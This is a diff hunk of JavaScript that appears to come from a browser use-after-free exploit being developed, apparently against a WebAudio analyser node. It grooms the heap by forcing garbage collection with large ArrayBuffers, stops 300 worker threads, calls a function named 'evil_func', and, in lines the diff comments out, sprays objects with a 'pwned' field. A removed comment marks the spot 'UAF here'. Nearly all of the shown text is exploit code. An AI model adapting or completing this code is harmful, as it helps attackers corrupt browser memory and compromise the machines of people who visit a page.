@@ -28,15 +28,20 @@ function gc() {
     for (let i = 0; i < 0x60; i++) { new ArrayBuffer(0x1000000); }
 }
 function callback(ev) {
+    for (let i=0; i<300; ++i)
+	window.top.arrayWorkers[i].postMessage("Stop");
     gc();
-    barrier = new MyObject();
-    analyserNode.evil_func(worker);
+    setTimeout(function() { 
+	    analyserNode.evil_func(worker);
+	}, 1000);
+    /*
     for (let i = 0; i < 230; ++i) { 
-	var tmp = {GetURL: "pwned", b: "b", c: "c", d: "d", e: "e"};
+	var tmp = {a: 1, b: 2, c: 3, d: 4};
 	analyserNode.angel_func(worker, tmp);
     }
-    // alert("Worker: " + worker + " --- GetURL(): " + worker.GetURL); // UAF here.
     worker.fuck = "you";
+    */
+    alert("DONE");
 }
 
 try {
